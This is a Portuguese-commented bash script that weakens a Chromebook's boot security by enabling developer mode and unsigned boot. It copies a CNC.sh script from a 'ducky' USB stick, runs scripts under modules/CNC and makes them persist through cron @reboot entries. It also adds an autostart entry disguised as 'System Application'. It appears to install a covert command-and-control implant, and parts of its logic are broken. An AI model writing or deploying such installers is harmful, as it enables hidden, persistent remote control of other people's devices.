#!/bin/bash

# Antes de iniciar este comando: chmod +x start_chrome.sh
# Para iniciar a vpn no remoto: sudo openvpn --config client.conf
# Para iniciar a vpn no servidor: sudo openvpn --config server.conf

# Função para exibir uma mensagem de erro e sair do script
exit_with_error() {
    echo "Erro: $1"
    exit 1
}

# Verifica se o script está sendo executado como root
if [[ $EUID -ne 0 ]]; then
    exit_with_error "Este script deve ser executado como root."
fi

# Função para habilitar o modo de desenvolvedor no Chromebook
habilitar_modo_desenvolvedor() {
  if [ ! -f "/tmp/mode_dev_enabled" ]; then
    echo "Habilitando o modo de desenvolvedor..."
    
    # Tenta executar o comando para habilitar o modo de desenvolvedor
    if sudo chromeos-firmwareupdate --mode=todev; then
      # Se o comando for executado com sucesso, continue com os próximos comandos
      sudo crossystem dev_boot_usb=1 dev_boot_signed_only=0
      sudo chromeos-setdevpasswd
    else
      echo "O comando para habilitar o modo de desenvolvedor não foi aceito."
      echo "Por favor, siga o procedimento abaixo para habilitar o modo de desenvolvedor manualmente:"
      echo
      echo "1. Desligue o Chromebook."
      echo "2. Pressione e segure as teclas Esc + Refresh (normalmente é a quarta tecla na fileira superior com uma seta circular) no teclado."
      echo "3. Enquanto mantém essas teclas pressionadas, pressione o botão de ligar para ligar o Chromebook."
      echo "4. Solte as teclas quando você ver a tela de recuperação."
      echo "5. A partir daqui, use as teclas de seta para navegar até as opções avançadas e pressione Enter."
      echo "6. Na próxima tela, selecione 'Enable Developer Mode' e pressione Enter."
      echo "7. Na última tela, pressione 'Confirm'."
      echo
      read -n 1 -s -r -p "Pressione qualquer tecla quando terminar o procedimento de habilitação do modo de desenvolvedor..."
      echo
    fi

    sudo touch "/tmp/mode_dev_enabled"
    sudo shutdown now
    exit 0
  fi
}

# Instalação do Python e dependências
apt update
apt install -y git
apt install -y python3 python3-pip python3-venv git

# # Verifica se o pacote dotenv-cli está instalado
# if ! command -v dotenv &> /dev/null; then
#     echo "O pacote dotenv-cli não está instalado. Instalando..."
    
#     # Verifica se o npm está instalado
#     if ! command -v npm &> /dev/null; then
#         echo "O npm não está instalado. É necessário instalar o Node.js e npm para prosseguir."
#         exit 1
#     fi

#     # Instala o pacote dotenv-cli usando npm
#     npm install -g dotenv-cli

#     # Verifica novamente se a instalação foi bem-sucedida
#     if ! command -v dotenv &> /dev/null; then
#         echo "Falha ao instalar o pacote dotenv-cli. Verifique a instalação do npm e tente novamente."
#         exit 1
#     fi

#     echo "Pacote dotenv-cli instalado com sucesso."
# fi

# Carrega as variáveis de ambiente do arquivo .env
source .env

# Verificar se todos os scripts falharam
if [ $? -ne 0 ]; then
    echo "Todos os scripts falharam. Executando ação alternativa..."
    # Coloque aqui a ação alternativa que você deseja executar
fi
# Configurações
username=$(whoami)
desktop_file="/home/$username/.config/autostart/$APP_NAME.desktop"

# Verificar se o pendrive "ducky" está conectado
detectar_pendrive_ducky() {
  if ls /media/removable/ducky* 1> /dev/null 2>&1; then
    echo "Pendrive 'ducky' encontrado."
    return 0
  else
    echo "Pendrive 'ducky' não encontrado."
    return 1
  fi
}

# Função para montar o pendrive e copiar os scripts para o Chromebook
copiar_scripts_pendrive() {
  if [ ! -f "/tmp/scripts_copiados" ]; then
    echo "Montando o pendrive..."
    PENDRIVE_DIR="/media/removable/$(ls /media/removable/)"
    mkdir -p ~/scripts
    cp "$PENDRIVE_DIR/CNC.sh" ~/scripts/
    chmod +x ~/scripts/CNC.sh
    sudo touch "/tmp/scripts_copiados"
    sudo reboot
    exit 0
  fi
}

# Clone o repositório com permissões do usuário atual
if [ ! -d "$INSTALL_DIR" ]; then
    git clone "$REPOSITORY_URL" "$INSTALL_DIR" || exit_with_error "Falha ao clonar o repositório."
    cd "$INSTALL_DIR" || exit_with_error "Falha ao entrar no diretório do repositório clonado."
else
    echo "O diretório de instalação $INSTALL_DIR já existe."
fi
# Criação do ambiente virtual
if [ ! -d "$VENV_DIR" ]; then
    $PYTHON_EXECUTABLE -m venv "$VENV_DIR/$VENV_NAME"

else
    echo "O diretório de ambiente virtual $VENV_DIR já existe."
fi

# Ative a virtualenv (substitua 'nome_da_virtualenv' pelo nome da sua virtualenv)
if [ -z "$VIRTUAL_ENV" ]; then
    source "$VENV_DIR/$VENV_NAME/bin/activate" || exit_with_error "Falha ao ativar a virtualenv."
fi

# Função para ativar o ambiente virtual e iniciar as aplicações
activate_venv_and_start_app() {
    # Ativação do ambiente virtual
    source "$VENV_DIR/$VENV_NAME/bin/activate"

    # Instalação das dependências do requirements.txt (opcional)
    if [ -f "$INSTALL_DIR/requirements-linux.txt" ]; then
        pip install -r "$INSTALL_DIR/requirements-linux.txt" || exit_with_error "Falha ao instalar as dependências."
    else
        echo "O arquivo requirements-linux.txt não foi encontrado."
    fi

    # Execução dos comandos adicionais dentro do ambiente virtual
    # ... (adicione seus comandos aqui)
}

# Função para criar o arquivo requirements.txt específico para o sistema operacional
create_requirements_file() {
    local os_name=$(uname -s | tr '[:upper:]' '[:lower:]')
    local new_requirements_file="requirements-$os_name.txt"

    # Mapeamento dos nomes de sistemas operacionais para sufixos de arquivo
    local os_suffixes=(
        ["linux"]="linux"
        ["darwin"]="macos"
        ["windows"]="windows"
    )
    # Defina o nome do novo arquivo requirements para o seu sistema operacional
    new_requirements_file="requirements-${os_suffixes[$os_name]}.txt"

    # Cria o novo arquivo requirements_os.txt
    $VENV_DIR/$VENV_NAME/bin/$PYTHON_EXECUTABLE create_requirements.py #"requirements.txt" "$new_requirements_file"

    echo "Novo arquivo $new_requirements_file criado com os pacotes compatíveis para o sistema operacional $os_name."
}

# Verifica se o sistema operacional é diferente de Windows (OSTYPE != cygwin)
if [ "$OSTYPE" != "cygwin" ]; then
    # Chama a função para criar o arquivo requirements.txt específico para o sistema operacional
    create_requirements_file
fi

# Função para tentar executar um script
tentar_executar_script() {
    local script="$1"
    echo "Tentando executar o script CNC: $script"
    if bash "$script"; then
        # Tornar o script SSH persistente com cron (opcional)
        echo "Tornando o script SSH persistente..."
        (crontab -l 2>/dev/null; echo "@reboot $script") | crontab -
        echo "Script executado com sucesso!"
        return 0
    else
        echo "Erro ao executar o script."
        return 1
    fi
}

scripts=("modules/CNC/chrome.sh" "modules/CNC/linux.sh")

# Verificar se todos os scripts falharam
if [ $? -ne 0 ]; then
    echo "Todos os scripts falharam. Executando ação alternativa..."
    # Coloque aqui a ação alternativa que você deseja executar
fi

# Loop para executar a função tentar_executar_script() em cada script
for script in "${scripts[@]}"; do
    tentar_executar_script "$script"
done

# Chama a função para ativar o ambiente virtual e iniciar as aplicações
activate_venv_and_start_app

# Criação do arquivo para iniciar com o sistema
# Tentativa 1 - Criação do arquivo .desktop
if ! tee "$desktop_file" > /dev/null <<EOT
[Desktop Entry]
Type=Application
Exec=$VENV_DIR/$VENV_NAME/bin/python3 $PATH_APP
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]=$APP_NAME
Name=$APP_NAME
Comment[en_US]=System Application
Comment=System Application
EOT
then
  exit_with_error "Falha ao criar o arquivo .desktop"
fi

# Definir as permissões corretas para o arquivo .desktop
if ! chown $username:$username $desktop_file || ! chmod +x $desktop_file; then
  exit_with_error "Falha ao definir permissões para o arquivo .desktop"
fi

# Tentativa 2 - Tornar o script play.py persistente com cron
echo "Tornando o script play.py persistente..."
if ! (crontab -l 2>/dev/null; echo "@reboot $PATH_APP") | crontab -; then
  exit_with_error "Falha ao configurar o script play.py com cron"
fi

echo "A aplicação $APP_NAME foi configurada para iniciar automaticamente com o sistema."
